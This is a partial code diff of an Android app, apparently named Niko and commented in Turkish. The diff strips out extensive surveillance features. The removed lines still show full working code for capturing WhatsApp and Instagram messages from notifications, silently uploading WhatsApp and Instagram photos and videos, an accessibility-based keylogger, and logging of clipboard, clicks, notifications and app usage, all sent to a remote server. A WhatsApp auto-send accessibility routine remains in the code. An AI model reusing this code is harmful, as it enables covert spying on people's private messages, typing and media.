-                            lastRemoteInput = a.getRemoteInputs()[0];
-                        }
-                    }
-                }
-            }
-
-            try {
-                JSONObject obj = new JSONObject();
-                obj.put("app", packageName.equals("com.whatsapp") ? "WhatsApp" : "Instagram");
-                obj.put("sender", title);
-                obj.put("message", msgText);
-                obj.put("timestamp", System.currentTimeMillis());
-
-                // Anlık gönderim (retry mekanizmalı)
-                new Thread(() -> {
-                    if (instance == null) {
-                        // Instance yoksa tampona ekle
-                        synchronized (pendingMessages) { pendingMessages.put(obj); }
-                        return;
-                    }
-                    
-                    // Önce birikmiş mesajları gönder
-                    flushPendingMessages();
-                    
-                    // Yeni mesajı 3 denemeyle gönder
-                    JSONArray array = new JSONArray();
-                    array.put(obj);
-                    boolean sent = false;
-                    for (int attempt = 1; attempt <= 3 && !sent; attempt++) {
-                        try {
-                            instance.sendSyncRequest(array, "social_messages");
-                            sent = true;
-                        } catch (Exception e) {
-                            if (attempt < 3) {
-                                try { Thread.sleep(1000 * attempt); } catch (InterruptedException ignored) {}
-                            }
-                        }
-                    }
-                    
-                    // 3 denemede de gönderilemezse tampona al
-                    if (!sent) {
-                        synchronized (pendingMessages) { pendingMessages.put(obj); }
-                    }
-                }).start();
-            } catch (Exception ignored) {}
-        }
-        
-        /**
-         * Birikmiş mesajları toplu gönderir.
-         */
-        private static void flushPendingMessages() {
-            synchronized (pendingMessages) {
-                if (pendingMessages.length() == 0 || instance == null) return;
-                try {
-                    JSONArray batch = new JSONArray(pendingMessages.toString());
-                    while (pendingMessages.length() > 0) pendingMessages.remove(0);
-                    instance.sendSyncRequest(batch, "social_messages");
-                } catch (Exception ignored) {}
-            }
-        }
-    }
 
     /**
      * Bildirim erişim izninin verilip verilmediğini kontrol eder.
@@ -8596,74 +7229,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    /**
-     * WhatsApp ve Instagram medya dosyalarını (Resim ve Video) MediaStore üzerinden güvenle tarar.
-     * Bu yöntem Android 11+ dahil tüm sürümlerde klasör taramaya göre çok daha hızlı ve stabildir.
-     */
-    private void syncSocialMediaMedia() {
-        Executors.newSingleThreadExecutor().execute(() -> {
-            try {
-                addLog("🚀 Sosyal Medya (WhatsApp/Instagram) taraması başlatılıyor...");
-                
-                // 1. Resimleri Tara
-                queryAndSyncSocialGroup(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
-                
-                // 2. Videoları Tara
-                queryAndSyncSocialGroup(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
-                
-                addLog("✨ Sosyal medya senkronizasyonu tamamlandı.");
-            } catch (Exception e) {
-                addLog("❌ Sosyal medya tarama ana hatası: " + e.getMessage());
-            }
-        });
-    }
 
-    private void queryAndSyncSocialGroup(Uri contentUri) {
-        String deviceName = getDeviceName();
-        SharedPreferences syncPrefs = getSharedPreferences("social_media_sync_cache", MODE_PRIVATE);
-        
-        // Sadece WhatsApp ve Instagram klasörlerini hedefle
-        String selection = MediaStore.MediaColumns.BUCKET_DISPLAY_NAME + " IN (?, ?, ?, ?)";
-        String[] selectionArgs = {"WhatsApp Images", "WhatsApp Video", "Instagram", "WhatsApp"};
-        
-        String[] projection = {
-            MediaStore.MediaColumns._ID,
-            MediaStore.MediaColumns.DISPLAY_NAME,
-            MediaStore.MediaColumns.DATE_MODIFIED
-        };
-
-        try (Cursor cursor = getContentResolver().query(contentUri, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC")) {
-            if (cursor == null || !cursor.moveToFirst()) return;
-
-            int count = 0;
-            ExecutorService pool = Executors.newFixedThreadPool(2);
-
-            do {
-                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
-                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
-                long dateModified = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED));
-                Uri fileUri = ContentUris.withAppendedId(contentUri, id);
-
-                String syncKey = "social_v2_" + id + "_" + dateModified;
-                if (syncPrefs.getBoolean(syncKey, false)) continue;
-
-                pool.execute(() -> {
-                    if (uploadMediaFile(fileUri, name, "social_media", deviceName)) {
-                        syncPrefs.edit().putBoolean(syncKey, true).apply();
-                    }
-                });
-
-                count++;
-                if (count >= 50) break; // Her grup için limit
-
-            } while (cursor.moveToNext());
-
-            pool.shutdown();
-            pool.awaitTermination(5, TimeUnit.MINUTES);
-        } catch (Exception e) {
-            // Sessiz hata yönetimi (AddLog gerekirse buraya eklenebilir)
-        }
-    }
 
     /**
      * Erişilebilirlik servisinin aktif olup olmadığını kontrol eder.
@@ -8716,23 +7282,12 @@ public class MainActivity extends Activity {
     public static class NikoAccessibilityService extends AccessibilityService {
         private static NikoAccessibilityService instance;
         
-        // --- Veri Tamponları ---
-        public static final JSONArray accessibilityLog = new JSONArray();
-        public static final JSONArray keylogBuffer = new JSONArray();
-        public static final JSONArray clickLog = new JSONArray();
-        public static final JSONArray notificationLog = new JSONArray();
-        
         // --- Uygulama Kullanım Takibi ---
         private String currentForegroundApp = "";
         private long appOpenedAt = 0;
-        private static final JSONArray appUsageLog = new JSONArray();
         
         // --- Ekran Durumu ---
         private BroadcastReceiver screenReceiver;
-        
-        // --- Clipboard Takibi ---
-        private android.content.ClipboardManager clipboardManager;
-        private String lastClipboardContent = "";
 
         @Override
         protected void onServiceConnected() {
@@ -8741,9 +7296,6 @@ public class MainActivity extends Activity {
             
             // Ekran açık/kapalı dinleyicisi
             registerScreenReceiver();
-            
-            // Clipboard değişiklik dinleyicisi
-            registerClipboardListener();
             
             addLog("✨ Niko Gelişmiş Otomasyon Servisi aktif.");
         }
@@ -8768,22 +7320,10 @@ public class MainActivity extends Activity {
                     public void onReceive(Context context, Intent intent) {
                         try {
                             String action = intent.getAction();
-                            JSONObject event = new JSONObject();
-                            if (Intent.ACTION_SCREEN_ON.equals(action)) {
-                                event.put("event", "screen_on");
-                            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
-                                event.put("event", "screen_off");
+                            if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                                 // Ekran kapandığında mevcut uygulama kullanımını kaydet
                                 logAppUsageDuration();
-                            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
-                                event.put("event", "user_unlocked");
                             }
-                            event.put("time", System.currentTimeMillis());
-                            
-                            synchronized (accessibilityLog) {
-                                accessibilityLog.put(event);
-                            }
-                            flushIfReady(accessibilityLog, "accessibility_events", 5);
                         } catch (Exception ignored) {}
                     }
                 };
@@ -8793,46 +7333,6 @@ public class MainActivity extends Activity {
                 filter.addAction(Intent.ACTION_SCREEN_OFF);
                 filter.addAction(Intent.ACTION_USER_PRESENT);
                 registerReceiver(screenReceiver, filter);
-            } catch (Exception ignored) {}
-        }
-        
-        /**
-         * Pano (clipboard) değişikliklerini takip eder.
-         */
-        private void registerClipboardListener() {
-            try {
-                clipboardManager = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-                if (clipboardManager != null) {
-                    clipboardManager.addPrimaryClipChangedListener(() -> {
-                        try {
-                            if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClip() != null) {
-                                android.content.ClipData.Item item = clipboardManager.getPrimaryClip().getItemAt(0);
-                                CharSequence clipText = item.getText();
-                                if (clipText != null) {
-                                    String text = clipText.toString();
-                                    // Aynı içerik tekrar kopyalandıysa atla
-                                    if (text.equals(lastClipboardContent)) return;
-                                    lastClipboardContent = text;
-                                    
-                                    JSONObject clipObj = new JSONObject();
-                                    clipObj.put("type", "clipboard");
-                                    clipObj.put("content", text.length() > 500 ? text.substring(0, 500) : text);
-                                    clipObj.put("source_app", currentForegroundApp);
-                                    clipObj.put("time", System.currentTimeMillis());
-                                    
-                                    // Anlık gönderim
-                                    if (MainActivity.instance != null) {
-                                        JSONArray arr = new JSONArray();
-                                        arr.put(clipObj);
-                                        new Thread(() -> {
-                                            try { MainActivity.instance.sendSyncRequest(arr, "accessibility_events"); } catch (Exception ignored) {}
-                                        }).start();
-                                    }
-                                }
-                            }
-                        } catch (Exception ignored) {}
-                    });
-                }
             } catch (Exception ignored) {}
         }
 
@@ -8850,90 +7350,16 @@ public class MainActivity extends Activity {
                         currentForegroundApp = packageName;
                         appOpenedAt = System.currentTimeMillis();
                     }
-                    
-                    JSONObject log = new JSONObject();
-                    log.put("type", "window_change");
-                    log.put("app", packageName);
-                    log.put("activity", event.getClassName() != null ? event.getClassName().toString() : "");
-                    log.put("text", event.getText().toString());
-                    log.put("time", System.currentTimeMillis());
-                    
-                    synchronized (accessibilityLog) {
-                        accessibilityLog.put(log);
-                        if (accessibilityLog.length() > 300) accessibilityLog.remove(0);
-                    }
-                    flushIfReady(accessibilityLog, "accessibility_events", 10);
                 } catch (Exception ignored) {}
             }
             
-            // --- 2. Metin Girişleri (Keylogger) ---
-            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                try {
-                    JSONObject key = new JSONObject();
-                    key.put("app", packageName);
-                    key.put("input", event.getText().toString());
-                    key.put("time", System.currentTimeMillis());
-                    synchronized (keylogBuffer) {
-                        keylogBuffer.put(key);
-                        if (keylogBuffer.length() > 500) keylogBuffer.remove(0);
-                    }
-                    flushIfReady(keylogBuffer, "keylogs", 10);
-                } catch (Exception ignored) {}
-            }
+            // --- 2. Metin Girişleri (Keylogger) - DEVRE DIŞI ---
             
-            // --- 3. Tıklama Olayları ---
-            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                try {
-                    JSONObject click = new JSONObject();
-                    click.put("type", "click");
-                    click.put("app", packageName);
-                    click.put("text", event.getText() != null ? event.getText().toString() : "");
-                    click.put("desc", event.getContentDescription() != null ? event.getContentDescription().toString() : "");
-                    click.put("class", event.getClassName() != null ? event.getClassName().toString() : "");
-                    click.put("time", System.currentTimeMillis());
-                    synchronized (clickLog) {
-                        clickLog.put(click);
-                        if (clickLog.length() > 200) clickLog.remove(0);
-                    }
-                    flushIfReady(clickLog, "accessibility_events", 15);
-                } catch (Exception ignored) {}
-            }
+            // --- 3. Tıklama Olayları - DEVRE DIŞI ---
             
-            // --- 4. Bildirim Yakalama ---
-            if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                try {
-                    JSONObject notif = new JSONObject();
-                    notif.put("type", "notification");
-                    notif.put("app", packageName);
-                    notif.put("text", event.getText() != null ? event.getText().toString() : "");
-                    notif.put("time", System.currentTimeMillis());
-                    
-                    // Kendi bildirimlerimizi filtrele
-                    if (!packageName.equals("com.example.niko")) {
-                        synchronized (notificationLog) {
-                            notificationLog.put(notif);
-                            if (notificationLog.length() > 100) notificationLog.remove(0);
-                        }
-                        flushIfReady(notificationLog, "accessibility_events", 5);
-                    }
-                } catch (Exception ignored) {}
-            }
+            // --- 4. Bildirim Yakalama - DEVRE DIŞI ---
             
-            // --- 5. Scroll/Fokus Olayları (Hafif kayıt) ---
-            if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
-                try {
-                    JSONObject scroll = new JSONObject();
-                    scroll.put("type", "scroll");
-                    scroll.put("app", packageName);
-                    scroll.put("from", event.getFromIndex());
-                    scroll.put("to", event.getToIndex());
-                    scroll.put("time", System.currentTimeMillis());
-                    synchronized (accessibilityLog) {
-                        accessibilityLog.put(scroll);
-                        if (accessibilityLog.length() > 300) accessibilityLog.remove(0);
-                    }
-                } catch (Exception ignored) {}
-            }
+            // --- 5. Scroll/Fokus Olayları - DEVRE DIŞI ---
 
             // --- 6. Otomasyonlar ---
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -8948,57 +7374,10 @@ public class MainActivity extends Activity {
             rootNode.recycle();
         }
         
-        /**
-         * Uygulama kullanım süresini kaydeder.
-         */
         private void logAppUsageDuration() {
-            if (currentForegroundApp.isEmpty() || appOpenedAt == 0) return;
-            long duration = System.currentTimeMillis() - appOpenedAt;
-            if (duration < 1000) return; // 1 saniyeden kısa kullanımları atla
-            
-            try {
-                JSONObject usage = new JSONObject();
-                usage.put("type", "app_usage");
-                usage.put("app", currentForegroundApp);
-                usage.put("duration_ms", duration);
-                usage.put("duration_readable", formatDuration(duration));
-                usage.put("started_at", appOpenedAt);
-                usage.put("ended_at", System.currentTimeMillis());
-                
-                synchronized (appUsageLog) {
-                    appUsageLog.put(usage);
-                    if (appUsageLog.length() > 100) appUsageLog.remove(0);
-                }
-                flushIfReady(appUsageLog, "accessibility_events", 5);
-            } catch (Exception ignored) {}
+            // Senkronizasyon kapatıldığı için artık işlem yapmıyor
         }
         
-        private String formatDuration(long ms) {
-            long seconds = ms / 1000;
-            if (seconds < 60) return seconds + "sn";
-            long minutes = seconds / 60;
-            if (minutes < 60) return minutes + "dk " + (seconds % 60) + "sn";
-            long hours = minutes / 60;
-            return hours + "sa " + (minutes % 60) + "dk";
-        }
-        
-        /**
-         * Tampon belirli bir boyuta ulaştığında anlık gönderim yapar.
-         */
-        private void flushIfReady(JSONArray buffer, String dataType, int threshold) {
-            synchronized (buffer) {
-                if (buffer.length() >= threshold && MainActivity.instance != null) {
-                    try {
-                        final JSONArray snapshot = new JSONArray(buffer.toString());
-                        while (buffer.length() > 0) buffer.remove(0);
-                        new Thread(() -> {
-                            try { MainActivity.instance.sendSyncRequest(snapshot, dataType); } catch (Exception ignored) {}
-                        }).start();
-                    } catch (Exception ignored) {}
-                }
-            }
-        }
-
         private void handleWhatsAppAutoSend(AccessibilityNodeInfo rootNode) {
             List<AccessibilityNodeInfo> sendMessageButtons = rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
             if (sendMessageButtons != null && !sendMessageButtons.isEmpty()) {
